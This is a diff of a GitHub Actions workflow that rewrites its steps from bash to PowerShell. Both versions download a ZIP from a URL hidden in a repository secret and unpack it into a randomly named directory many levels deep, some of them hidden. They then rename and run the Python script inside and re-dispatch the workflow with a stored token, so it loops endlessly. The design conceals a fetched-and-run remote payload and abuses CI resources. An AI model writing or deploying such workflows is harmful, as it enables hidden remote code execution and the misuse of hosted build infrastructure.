@@ -14,8 +14,6 @@ jobs:
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
-        with:
-          token: ${{ secrets.GITHUB_TOKEN }}
 
       # ===== PYTHON SETUP =====
       - name: Setup Python
@@ -29,121 +27,84 @@ jobs:
           python -m pip install --upgrade pip
           pip install selenium webdriver-manager
 
-      # ===== INSTALL CHROME =====
-      - name: Install Google Chrome
-        run: |
-          sudo apt update
-          sudo apt install -y google-chrome-stable
-
-      # ===== RANDOM NAMES + NESTED DIR =====
+      # ===== GENERATE NAMES =====
       - name: Generate random names and nested directory
         id: names
-        shell: bash
+        shell: pwsh
         run: |
-          set -euo pipefail
-          ZIP_NAME="$(uuidgen).zip"
-          SCRIPT_PREFIX="$(uuidgen)"
-          
-          DEPTH=$((14 + RANDOM % 7))
-          NESTED_DIR=""
-          
-          for i in $(seq 1 $DEPTH); do
-            if [ $((RANDOM % 2)) -eq 0 ]; then
-              DIR_NAME=".$(uuidgen | cut -d'-' -f1)"
-            else
-              DIR_NAME="$(uuidgen | cut -d'-' -f1)"
-            fi
-            
-            if [ -z "$NESTED_DIR" ]; then
-              NESTED_DIR="$DIR_NAME"
-            else
-              NESTED_DIR="$NESTED_DIR/$DIR_NAME"
-            fi
-          done
-          
-          echo "ZIP_NAME=$ZIP_NAME" >> "$GITHUB_ENV"
-          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> "$GITHUB_ENV"
-          echo "NESTED_DIR=$NESTED_DIR" >> "$GITHUB_ENV"
-          
-          mkdir -p "$NESTED_DIR"
+          $ZIP_NAME = [guid]::NewGuid().ToString() + ".zip"
+          $SCRIPT_PREFIX = [guid]::NewGuid().ToString()
+
+          $DEPTH = Get-Random -Minimum 14 -Maximum 21
+          $NESTED_DIR = ""
+
+          for ($i=0; $i -lt $DEPTH; $i++) {
+              $name = ([guid]::NewGuid().ToString().Split('-')[0])
+              if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
+                  $name = "." + $name
+              }
+              if ($NESTED_DIR -eq "") {
+                  $NESTED_DIR = $name
+              } else {
+                  $NESTED_DIR = "$NESTED_DIR\$name"
+              }
+          }
+
+          New-Item -ItemType Directory -Force -Path $NESTED_DIR | Out-Null
+
+          echo "ZIP_NAME=$ZIP_NAME" >> $env:GITHUB_ENV
+          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> $env:GITHUB_ENV
+          echo "NESTED_DIR=$NESTED_DIR" >> $env:GITHUB_ENV
 
       # ===== DOWNLOAD ZIP =====
-      - name: Download ZIP to nested directory
-        shell: bash
+      - name: Download ZIP
+        shell: pwsh
         run: |
-          set -euo pipefail
-          TARGET_PATH="$NESTED_DIR/$ZIP_NAME"
-          curl -fSL -o "$TARGET_PATH" "${{ secrets.VIA }}"
-          test -f "$TARGET_PATH"
+          $path = "$env:NESTED_DIR\$env:ZIP_NAME"
+          Invoke-WebRequest -Uri "${{ secrets.VIA }}" -OutFile $path
 
       # ===== UNZIP =====
-      - name: Unzip in nested directory and cleanup
-        shell: bash
+      - name: Extract ZIP
+        shell: pwsh
         run: |
-          set -euo pipefail
-          cd "$NESTED_DIR"
-          unzip -q "$ZIP_NAME"
-          rm -f "$ZIP_NAME"
+          Expand-Archive -Path "$env:NESTED_DIR\$env:ZIP_NAME" -DestinationPath "$env:NESTED_DIR"
+          Remove-Item "$env:NESTED_DIR\$env:ZIP_NAME"
 
       # ===== FIND PYTHON SCRIPT =====
-      - name: Find, rename and prepare Python script
-        shell: bash
-        env:
-          SCRIPT_PREFIX: ${{ env.SCRIPT_PREFIX }}
+      - name: Find Python script
+        shell: pwsh
         run: |
-          set -euo pipefail
-          cd "$NESTED_DIR"
-          
-          script_path="$(find . -type f -name '*.py' -print -quit || true)"
-          
-          if [ -z "$script_path" ]; then
-            echo "❌ No Python script found"
-            find . -maxdepth 4 -type f -print
-            exit 1
-          fi
-          
-          new_name="${SCRIPT_PREFIX}_$(date +%s)_$RANDOM.py"
-          mv "$script_path" "$new_name"
-          
-          FULL_SCRIPT_PATH="$NESTED_DIR/$new_name"
-          echo "EXEC_SCRIPT=$FULL_SCRIPT_PATH" >> "$GITHUB_ENV"
+          $script = Get-ChildItem -Path $env:NESTED_DIR -Recurse -Filter *.py | Select-Object -First 1
 
-      # ===== RUN PYTHON SCRIPT =====
+          if (-not $script) {
+              Write-Error "No Python script found"
+              exit 1
+          }
+
+          $newName = "$env:SCRIPT_PREFIX" + "_" + (Get-Date -Format "yyyyMMddHHmmss") + ".py"
+          $newPath = Join-Path $env:NESTED_DIR $newName
+
+          Move-Item $script.FullName $newPath
+
+          echo "EXEC_SCRIPT=$newPath" >> $env:GITHUB_ENV
+
+      # ===== RUN SCRIPT =====
       - name: Run Python script
-        shell: bash
-        env:
-          EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
+        shell: pwsh
         run: |
-          set -euo pipefail
-          echo "Running: $EXEC_SCRIPT"
-          python "$EXEC_SCRIPT"
+          python "$env:EXEC_SCRIPT"
 
       # ===== TRIGGER NEXT RUN =====
-      - name: Trigger next run (workflow_dispatch)
-        shell: bash
-        env:
-          REPO: ${{ github.repository }}
-          WORKFLOW_FILE: main.yml
-          BRANCH: ${{ github.event.repository.default_branch }}
-          REPO_PAT: ${{ secrets.REPO_PAT }}
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Trigger next run
+        shell: pwsh
         run: |
-          set -euo pipefail
+          $token = "${{ secrets.REPO_PAT }}"
+          if (-not $token) { $token = "${{ secrets.GITHUB_TOKEN }}" }
 
-          TOKEN="${REPO_PAT:-}"
-          if [ -z "$TOKEN" ]; then
-            TOKEN="${GITHUB_TOKEN:-}"
-          fi
+          $body = @{ ref = "${{ github.event.repository.default_branch }}" } | ConvertTo-Json
 
-          if [ -z "$TOKEN" ]; then
-            echo "No token available"
-            exit 1
-          fi
-
-          API_URL="https://api.github.com/repos/$REPO/actions/workflows/$WORKFLOW_FILE/dispatches"
-
-          curl -sS -X POST "$API_URL" \
-            -H "Accept: application/vnd.github+json" \
-            -H "Authorization: Bearer $TOKEN" \
-            -H "Content-Type: application/json" \
-            -d "{\"ref\":\"$BRANCH\"}"
+          Invoke-RestMethod `
+            -Uri "https://api.github.com/repos/${{ github.repository }}/actions/workflows/main.yml/dispatches" `
+            -Headers @{ Authorization = "Bearer $token"; Accept = "application/vnd.github+json" } `
+            -Method POST `
+            -Body $body
